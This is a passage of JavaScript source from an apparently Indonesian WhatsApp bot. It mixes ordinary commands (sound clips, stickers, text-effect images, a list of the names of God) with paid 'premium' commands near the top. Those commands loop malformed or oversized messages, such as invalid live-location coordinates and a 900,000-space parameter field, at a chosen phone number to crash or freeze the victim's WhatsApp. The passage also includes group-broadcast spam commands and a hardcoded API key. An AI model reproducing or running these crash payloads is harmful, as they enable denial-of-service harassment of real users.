if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
reply('sukse cok')
for (let j = 0; j < jumlah; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `X-code 🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️🌪️`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: m })
await kalz.relayMessage(target, etc.message, { messageId: etc.key.id })
}
await reply('✅Succes')
}
break
//=================================================//
case 'null-chace': {
if (!isPrem) return m.reply('Buy Reseller dulu cuma 4k kok, but ke 6289528157038')
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
ngeloc(m.chat, force)
}
await reply('✅Succes')
}
break
//=================================================//
case 'prikitiw': {
if (!isPrem) return m.reply('Buy Reseller dulu cuma 4k kok, but ke 6289528157038')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
  for (let j = 10; j < q; j++) {
    await ngeloc(target, sirbug)
  }
 await reply('✅Succes')
}
break
//=================================================//
case 'bgtes2': {
if (!isPrem) return m.reply('Buy Reseller dulu cuma 4k kok, but ke 6289528157038')
if (!q) return reply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "X-code 🌪️🌪️🌪️🌪️🌪️🌪️🔥🔥🔥🔥🔥🔥"
    },
    "footer": {
      "text": "$ bugCreak\n> Welcome To My Console\n> Command this /ddos /bugWh /bugRoot /bugWebsps /bugThojr /bugMalware /Ransomware"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'X-Code🌪️🌪️🌪️', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(900000)
    }
  }
}
}
}), { userJid: m.chat, quoted: m })
await kalz.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id })
await sleep(700)
}
}
break
		
		case 'anonymhacker':
		   
			if (args.length == 0) return reply(`Example: ${prefix + command} ManzGans`)
			reply(mess.wait)
			kalz.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${apikey}&text=${args}`}, caption: `© Kalzx`}, { quoted: m})
			break
			
			case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
await loading()
arxzy = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await kalz.sendMessage(m.chat, { audio: arxzy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
            case 'toaudio': {
    await loading()
            if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
            let media = await kalz.downloadMediaMessage(qmsg)
            let audio = await toAudio(media, 'mp4')
            kalz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            
            }
            break
            case 'toimage': 
            case 'toimg': {
                if (!/webp/.test(mime)) return reply(`Reply sticker dengan caption *${prefix + command}*`)
               await loading()
                let media = await kalz.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    kalz.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
                
            }
            break
            
         case 'simi': case 'hai': {
            if (!text) return reply(`${command} Simi ucul`)
               replay(mess.search)
                  let kalzxi = 
                    await fetchJson
                      (`https://api.shannmoderz.xyz/ai/simsimi?query=${text}`)
 kalz.sendMessage(m.chat, {
      text: kalzxi.result,
         contextInfo: {
           externalAdReply: {
             showAdAttribution: true,
               title: `S I M I - G E M O Y 🐤`,
                 body: '© KalzxFeatures',
                  thumbnailUrl: 
                    "https://telegra.ph/file/90fe0ea7e8eb675f30298.jpg",
                       sourceUrl: hariini,
                         mediaType: 1,
                       renderLargerThumbnail: true
                     }}

                    })
                  }
                   break
                   
           case 'ai': case 'openai': {
              if (!text) return replay(`${command} Apa itu Coding`)
                replay(mess.search)
         let kalzxh = 
         await fetchJson
           (`https://api.shannmoderz.xyz/ai/letmegpt?query=${text}`)
              kalz.sendMessage(m.chat, {
                text: kalzxh.result,
                   contextInfo: {
                     externalAdReply: {
                       showAdAttribution: true,
                         title: `O P E N - A I`,
                           body: '',
                             thumbnailUrl: 
                          "https://telegra.ph/file/e9a9350f79622a857e59b.jpg",
                        sourceUrl: hariini,
                    mediaType: 1,
                  renderLargerThumbnail: true
               }}

             })
           }
            break
            
            
            
              case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replay(`Contoh : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replay(`Contoh : ${prefix + command} 😅+🤔`)
                replay('Tungguin ya')
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await kalz.sendImageAsSticker(m.chat, res.url, m, {
                        packname: botname,
                        author: ownername,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
                
            }
            break
            
            case 'emojimix2': {
               
                if (!text) return replay(`Contoh : ${prefix + command} 🧐`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                for (let res of anu.results) {
                    let encmedia = await kalz.sendImageAsSticker(m.chat, res.url, m, {
                        packname: botname,
                        author: ownername,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
                
            }
            break
            
            case "welcome":
{
if (!isCreator) return m.reply('*khusus Premium*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
await loading()
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
var groupe = await kalz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kalz.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome  di group ini')
}
}
break
		
case "jpm": {
if (!isCreator) return kalzxy(`hai ${pushname} fitur ini khusus owner`)
if (!text) return m.reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"))
let image = await kalz.downloadAndSaveMediaMessage(qmsg)
let total = 0
let getGroups = await kalz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*`)
for (let jid of usergc) {
try {
kalz.sendMessage(jid, {image: await fs.readFileSync(image), caption: text, contextInfo: {forwardingScore: 1,
isForwarded: true}}, {quoted: m})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break
		
case "jpmpromosi": case "jpmpromo": case "jpm1": {
if (!isCreator) return kalzxy('khusus owner')
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await kalz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let teksnya = teks
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
},
body: proto.Message.InteractiveMessage.Header.create({
text: teksnya,
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url : thumb } }, { upload: kalz.waUploadToServer }))
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6289528157038\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel})
for (let jid of usergc) {
try {
await kalz.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break

case 'google':{
if (!text) return replay(`Contoh : ${prefix + command} fatih arridho`)
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `• *Title* : ${g.title}\n`
                teks += `• *Description* : ${g.snippet}\n`
                teks += `• *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                replayy(teks)
                })
                }
            break
		          	case 'alquranaudio': {
			    
                if (args.length == 0) return replay(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                replay(mess.wait)
                kalz.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${args[0]}?apikey=${apikey}`}, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
            }
            break
          
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return replay(`Example : ${prefix+command} Natalia`) 
replay(mess.wait)
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
kalz.sendMessage(m.chat, { image: { url: haldwhd }, caption: `BERHASIL DI BUAT 🔥` }, { quoted: m })
}
break
            

case 'kisahnabi': {
     if (!text) return replynano(`Masukan nama nabi\nExample: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return replay("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     replay(`${hasil}`)

}
break
//=========================================\\
case 'asmaulhusna': {
const asmaulhusna = [
    {
        index: 1,
        latin: "Ar Rahman",
        arabic: "الرَّحْمَنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemurah",
        translation_en: "The All Beneficent"
    },
    {
        index: 2,
        latin: "Ar Rahiim",
        arabic: "الرَّحِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Penyayang",
        translation_en: "The Most Merciful"
    },
    {
        index: 3,
        latin: "Al Malik",
        arabic: "الْمَلِكُ",
        translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
        translation_en: "The King, The Sovereign"
    },
    {
        index: 4,
        latin: "Al Quddus",
        arabic: "الْقُدُّوسُ",
        translation_id: "Yang Memiliki Mutlak sifat Suci",
        translation_en: "The Most Holy"
    },
    {
        index: 5,
        latin: "As Salaam",
        arabic: "السَّلاَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
        translation_en: "Peace and Blessing"
    },
    {
        index: 6,
        latin: "Al Mu’min",
        arabic: "الْمُؤْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
        translation_en: "The Guarantor"
    },
    {
        index: 7,
        latin: "Al Muhaimin",
        arabic: "الْمُهَيْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
        translation_en: "The Guardian, the Preserver"
    },
    {
        index: 8,
        latin: "Al ‘Aziiz",
        arabic: "الْعَزِيزُ",
        translation_id: "Yang Memiliki Mutlak Kegagahan",
        translation_en: "The Almighty, the Self Sufficient"
    },
    {
        index: 9,
        latin: "Al Jabbar",
        arabic: "الْجَبَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Perkasa",
        translation_en: "The Powerful, the Irresistible"
    },
    {
        index: 10,
        latin: "Al Mutakabbir",
        arabic: "الْمُتَكَبِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
        translation_en: "The Tremendous"
    },
    {
        index: 11,
        latin: "Al Khaliq",
        arabic: "الْخَالِقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pencipta",
        translation_en: "The Creator"
    },
    {
        index: 12,
        latin: "Al Baari’",
        arabic: "الْبَارِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
        translation_en: "The Maker"
    },
    {
        index: 13,
        latin: "Al Mushawwir",
        arabic: "الْمُصَوِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
        translation_en: "The Fashioner of Forms"
    },
    {
        index: 14,
        latin: "Al Ghaffaar",
        arabic: "الْغَفَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Pengampun",
        translation_en: "The Ever Forgiving"
    },
    {
        index: 15,
        latin: "Al Qahhaar",
        arabic: "الْقَهَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Memaksa",
        translation_en: "The All Compelling Subduer"
    },
    {
        index: 16,
        latin: "Al Wahhaab",
        arabic: "الْوَهَّابُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
        translation_en: "The Bestower"
    },
    {
        index: 17,
        latin: "Ar Razzaaq",
        arabic: "الرَّزَّاقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
        translation_en: "The Ever Providing"
    },
    {
        index: 18,
        latin: "Al Fattaah",
        arabic: "الْفَتَّاحُ",
        translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
        translation_en: "The Opener, the Victory Giver"
    },
    {
        index: 19,
        latin: "Al ‘Aliim",
        arabic: "اَلْعَلِيْمُ",
        translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
        translation_en: "The All Knowing, the Omniscient"
    },
    {
        index: 20,
        latin: "Al Qaabidh",
        arabic: "الْقَابِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
        translation_en: "The Restrainer, the Straightener"
    },
    {
        index: 21,
        latin: "Al Baasith",
        arabic: "الْبَاسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
        translation_en: "The Expander, the Munificent"
    },
    {
        index: 22,
        latin: "Al Khaafidh",
        arabic: "الْخَافِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
        translation_en: "The Abaser"
    },
    {
        index: 23,
        latin: "Ar Raafi’",
        arabic: "الرَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
        translation_en: "The Exalter"
    },
    {
        index: 24,
        latin: "Al Mu’izz",
        arabic: "الْمُعِزُّ",
        translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
        translation_en: "The Giver of Honor"
    },
    {
        index: 25,
        latin: "Al Mudzil",
        arabic: "المُذِلُّ",
        translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
        translation_en: "The Giver of Dishonor"
    },
    {
        index: 26,
        latin: "Al Samii’",
        arabic: "السَّمِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
        translation_en: "The All Hearing"
    },
    {
        index: 27,
        latin: "Al Bashiir",
        arabic: "الْبَصِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
        translation_en: "The All Seeing"
    },
    {
        index: 28,
        latin: "Al Hakam",
        arabic: "الْحَكَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
        translation_en: "The Judge, the Arbitrator"
    },
    {
        index: 29,
        latin: "Al ‘Adl",
        arabic: "الْعَدْلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Utterly Just"
    },
    {
        index: 30,
        latin: "Al Lathiif",
        arabic: "اللَّطِيفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
        translation_en: "The Subtly Kind"
    },
    {
        index: 31,
        latin: "Al Khabiir",
        arabic: "الْخَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
        translation_en: "The All Aware"
    },
    {
        index: 32,
        latin: "Al Haliim",
        arabic: "الْحَلِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
        translation_en: "The Forbearing, the Indulgent"
    },
    {
        index: 33,
        latin: "Al ‘Azhiim",
        arabic: "الْعَظِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
        translation_en: "The Magnificent, the Infinite"
    },
    {
        index: 34,
        latin: "Al Ghafuur",
        arabic: "الْغَفُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
        translation_en: "The All Forgiving"
    },
    {
        index: 35,
        latin: "As Syakuur",
        arabic: "الشَّكُورُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
        translation_en: "The Grateful"
    },
    {
        index: 36,
        latin: "Al ‘Aliy",
        arabic: "الْعَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Sublimely Exalted"
    },
    {
        index: 37,
        latin: "Al Kabiir",
        arabic: "الْكَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
        translation_en: "The Great"
    },
    {
        index: 38,
        latin: "Al Hafizh",
        arabic: "الْحَفِيظُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
        translation_en: "The Preserver"
    },
    {
        index: 39,
        latin: "Al Muqiit",
        arabic: "المُقيِت",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
        translation_en: "The Nourisher"
    },
    {
        index: 40,
        latin: "Al Hasiib",
        arabic: "الْحسِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
        translation_en: "The Reckoner"
    },
    {
        index: 41,
        latin: "Al Jaliil",
        arabic: "الْجَلِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Majestic"
    },
    {
        index: 42,
        latin: "Al Kariim",
        arabic: "الْكَرِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
        translation_en: "The Bountiful, the Generous"
    },
    {
        index: 43,
        latin: "Ar Raqiib",
        arabic: "الرَّقِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
        translation_en: "The Watchful"
    },
    {
        index: 44,
        latin: "Al Mujiib",
        arabic: "الْمُجِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
        translation_en: "The Responsive, the Answerer"
    },
    {
        index: 45,
        latin: "Al Waasi’",
        arabic: "الْوَاسِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
        translation_en: "The Vast, the All Encompassing"
    },
    {
        index: 46,
        latin: "Al Hakiim",
        arabic: "الْحَكِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
        translation_en: "The Wise"
    },
    {
        index: 47,
        latin: "Al Waduud",
        arabic: "الْوَدُودُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
        translation_en: "The Loving, the Kind One"
    },
    {
        index: 48,
        latin: "Al Majiid",
        arabic: "الْمَجِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The All Glorious"
    },
    {
        index: 49,
        latin: "Al Baa’its",
        arabic: "الْبَاعِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
        translation_en: "The Raiser of the Dead"
    },
    {
        index: 50,
        latin: "As Syahiid",
        arabic: "الشَّهِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
        translation_en: "The Witness"
    },
    {
        index: 51,
        latin: "Al Haqq",
        arabic: "الْحَقُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
        translation_en: "The Truth, the Real"
    },
    {
        index: 52,
        latin: "Al Wakiil",
        arabic: "الْوَكِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
        translation_en: "The Trustee, the Dependable"
    },
    {
        index: 53,
        latin: "Al Qawiyyu",
        arabic: "الْقَوِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
        translation_en: "The Strong"
    },
    {
        index: 54,
        latin: "Al Matiin",
        arabic: "الْمَتِينُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
        translation_en: "The Firm, the Steadfast"
    },
    {
        index: 55,
        latin: "Al Waliyy",
        arabic: "الْوَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
        translation_en: "The Protecting Friend, Patron, and Helper"
    },
    {
        index: 56,
        latin: "Al Hamiid",
        arabic: "الْحَمِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
        translation_en: "The All Praiseworthy"
    },
    {
        index: 57,
        latin: "Al Mushii",
        arabic: "الْمُحْصِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
        translation_en: "The Accounter, the Numberer of All"
    },
    {
        index: 58,
        latin: "Al Mubdi’",
        arabic: "الْمُبْدِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
        translation_en: "The Producer, Originator, and Initiator of all"
    },
    {
        index: 59,
        latin: "Al Mu’iid",
        arabic: "الْمُعِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
        translation_en: "The Reinstater Who Brings Back All"
    },
    {
        index: 60,
        latin: "Al Muhyii",
        arabic: "الْمُحْيِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
        translation_en: "The Giver of Life"
    },
    {
        index: 61,
        latin: "Al Mumiitu",
